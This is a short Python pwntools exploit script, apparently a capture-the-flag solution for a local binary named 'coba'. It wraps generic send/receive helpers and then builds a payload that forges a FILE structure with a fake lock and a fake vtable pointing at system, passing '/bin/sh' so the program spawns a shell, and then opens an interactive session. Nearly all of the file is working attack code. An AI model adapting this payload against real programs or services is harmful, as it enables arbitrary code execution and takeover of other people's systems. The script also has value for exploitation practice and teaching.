
from pwn import *
import sys
#from LibcSearcher import LibcSearcher

#MyTemplate
program = 'coba'
elf = ELF(program,checksec=False)
lokal = True
#context.arch = ''

s    = lambda data               :xp.send(data)
sa   = lambda delim,data         :xp.sendafter(delim,data)
sl   = lambda data               :xp.sendline(data)
sla  = lambda delim,data         :xp.sendlineafter(delim,data)
r    = lambda numb=4096          :xp.recv(numb)
ru   = lambda delims, drop=True  :xp.recvuntil(delims, drop)
uu64 = lambda x                  :u64(x.ljust(8,"\x00"))
uu32 = lambda x                  :u32(x.ljust(4,"\x00"))

if len(sys.argv) > 1:
	Debug = True
else:
	Debug = False


if lokal:
    xp = elf.process()
    #libc = elf.libc
else:
    host = ''
    port = ''
    xp = remote(host,port)
    #libc = ELF("givenlibc",checksec=False)

if Debug:
    #context.log_level='debug'
    context.terminal = ["tmux","splitw","-h"]
    cmd = ""
    gdb.attach(xp,cmd)

#Exploit Here
# system = 0x7ffff7a523a0

p = "/bin/sh\x00" #argumen
p += p64(0)*16 #junk
p += p64(0x601080+16) #lock #17
p += p64(0)*9 #junk
p += p64(0x601108) #rax -> rax+0x88 vtbale (alamat system -0x88) #27
p += p64(0)*4
p += p64(0x601080) #ourname
p += p64(0)
# p += "AAAABBBB"
p += p64(elf.plt['system'])
sl(p)

xp.interactive()
